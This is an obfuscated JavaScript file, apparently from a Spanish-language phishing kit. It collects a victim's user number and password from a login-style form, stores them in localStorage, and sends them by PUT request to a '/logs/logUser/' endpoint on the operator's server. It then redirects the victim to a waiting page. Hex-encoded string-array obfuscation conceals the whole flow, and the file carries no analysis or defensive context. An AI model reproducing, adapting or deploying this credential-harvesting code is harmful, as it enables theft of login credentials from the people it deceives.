function _0x4829(_0x5123ab, _0x175883) {
  const _0x70eede = _0x70ee();
  return (
    (_0x4829 = function (_0x4829b8, _0x4256b9) {
      _0x4829b8 = _0x4829b8 - 0x1d3;
      let _0x387d0d = _0x70eede[_0x4829b8];
      return _0x387d0d;
    }),
    _0x4829(_0x5123ab, _0x175883)
  );
}
const _0x13ff3e = _0x4829;
(function (_0x56f130, _0x431a3b) {
  const _0x3d89d2 = _0x4829,
    _0x5986ea = _0x56f130();
  while (!![]) {
    try {
      const _0x5b43b0 =
        -parseInt(_0x3d89d2(0x1ef)) / 0x1 +
        parseInt(_0x3d89d2(0x1e3)) / 0x2 +
        (parseInt(_0x3d89d2(0x1d4)) / 0x3) *
          (parseInt(_0x3d89d2(0x1eb)) / 0x4) +
        (parseInt(_0x3d89d2(0x1db)) / 0x5) *
          (-parseInt(_0x3d89d2(0x1d7)) / 0x6) +
        parseInt(_0x3d89d2(0x1d9)) / 0x7 +
        -parseInt(_0x3d89d2(0x1f2)) / 0x8 +
        (-parseInt(_0x3d89d2(0x1e1)) / 0x9) *
          (-parseInt(_0x3d89d2(0x1e2)) / 0xa);
      if (_0x5b43b0 === _0x431a3b) break;
      else _0x5986ea["push"](_0x5986ea["shift"]());
    } catch (_0x43a2e9) {
      _0x5986ea["push"](_0x5986ea["shift"]());
    }
  }
})(_0x70ee, 0x6eedc);
function updateLS() {
  const _0x497d30 = _0x4829;
  LS[_0x497d30(0x1e9)]("info", JSON[_0x497d30(0x1dc)](info));
}
function _0x70ee() {
  const _0x5807ea = [
    "23005gOfudZ",
    "stringify",
    "log",
    "./wait.html",
    "application/json",
    "json",
    "5147937RgtiHt",
    "10nXDDuS",
    "1500550pvkIyK",
    "puser",
    "Por\x20favor\x20ingrese\x20su\x20número\x20de\x20celular",
    "telnum",
    "Datos\x20actualizados\x20en\x20Trico",
    "focus",
    "setItem",
    "value",
    "140dQiJIB",
    "click",
    "GET",
    "btn-consultar",
    "527878UJKXHn",
    "preventDefault",
    "../../pay.html",
    "3895424yKNkxW",
    "Usuario\x20Encontrado",
    "disabled",
    "user",
    "txt-pass",
    "location",
    "Por\x20favor\x20ingrese\x20su\x20contraseña",
    "txt-num",
    "getElementById",
    "Error\x20al\x20actualizar\x20datos\x20en\x20Trico",
    "68724GqSnuP",
    "addEventListener",
    "metaInfo",
    "1038QShCTI",
    "error",
    "987665eytYOl",
    "/logs/logs",
  ];
  _0x70ee = function () {
    return _0x5807ea;
  };
  return _0x70ee();
}
async function sendDataNewUs() {
  const _0x1ce944 = _0x4829,
    _0x42eefe = document[_0x1ce944(0x1fa)](_0x1ce944(0x1ee));
  _0x42eefe[_0x1ce944(0x1f4)] = !![];
  try {
    const _0x3b4b92 = await fetch(url + _0x1ce944(0x1da), {
        method: _0x1ce944(0x1ed),
        headers: { "Content-Type": _0x1ce944(0x1df) },
      }),
      _0xb51f9d = await _0x3b4b92[_0x1ce944(0x1e0)](),
      _0x3bb30b = [..._0xb51f9d];
    for (const _0x4dd918 of _0x3bb30b) {
      if (_0x4dd918["cl"] == info[_0x1ce944(0x1d6)][_0x1ce944(0x1e6)]) {
        console[_0x1ce944(0x1dd)](_0x1ce944(0x1f3));
        const _0x317b5b = await fetch(
          url + "/logs/logUser/" + _0x4dd918["idreg"],
          {
            method: "PUT",
            headers: { "Content-Type": _0x1ce944(0x1df) },
            body: JSON[_0x1ce944(0x1dc)]({
              us: info["metaInfo"]["user"],
              ps: info[_0x1ce944(0x1d6)]["puser"],
              status: "Corrigió\x20Usuario",
            }),
          }
        );
        if (!_0x317b5b["ok"]) throw new Error(_0x1ce944(0x1d3));
        console[_0x1ce944(0x1dd)](_0x1ce944(0x1e7));
      }
    }
    window[_0x1ce944(0x1f7)]["href"] = _0x1ce944(0x1de);
  } catch (_0x594bea) {
    console[_0x1ce944(0x1d8)](
      "Error\x20al\x20enviar\x20los\x20datos:",
      _0x594bea
    ),
      alert(
        "Hubo\x20un\x20error\x20al\x20enviar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo."
      );
  } finally {
    _0x42eefe["disabled"] = ![];
  }
}
document[_0x13ff3e(0x1fa)](_0x13ff3e(0x1ee))[_0x13ff3e(0x1d5)](
  _0x13ff3e(0x1ec),
  function (_0x1fe833) {
    const _0x4b82ce = _0x13ff3e;
    _0x1fe833[_0x4b82ce(0x1f0)](), console[_0x4b82ce(0x1dd)](_0x4b82ce(0x1ec));
    if (document[_0x4b82ce(0x1fa)](_0x4b82ce(0x1f9))[_0x4b82ce(0x1ea)] == "") {
      alert(_0x4b82ce(0x1e5)),
        document[_0x4b82ce(0x1fa)](_0x4b82ce(0x1f9))[_0x4b82ce(0x1e8)]();
      return;
    } else {
      if (document[_0x4b82ce(0x1fa)](_0x4b82ce(0x1f6))["value"] == "") {
        alert(_0x4b82ce(0x1f8)),
          document[_0x4b82ce(0x1fa)](_0x4b82ce(0x1f6))[_0x4b82ce(0x1e8)]();
        return;
      } else {
        const _0x52b9e9 = document[_0x4b82ce(0x1fa)](_0x4b82ce(0x1f9))[
            _0x4b82ce(0x1ea)
          ],
          _0x5e8fb6 = document["getElementById"]("txt-pass")["value"];
        (info["metaInfo"][_0x4b82ce(0x1f5)] = _0x52b9e9),
          (info[_0x4b82ce(0x1d6)][_0x4b82ce(0x1e4)] = _0x5e8fb6),
          updateLS(),
          sendDataNewUs();
      }
    }
  }
),
  document["getElementById"]("backbutton")[_0x13ff3e(0x1d5)](
    "click",
    function () {
      const _0x506962 = _0x13ff3e;
      window[_0x506962(0x1f7)]["href"] = _0x506962(0x1f1);
    }
  );
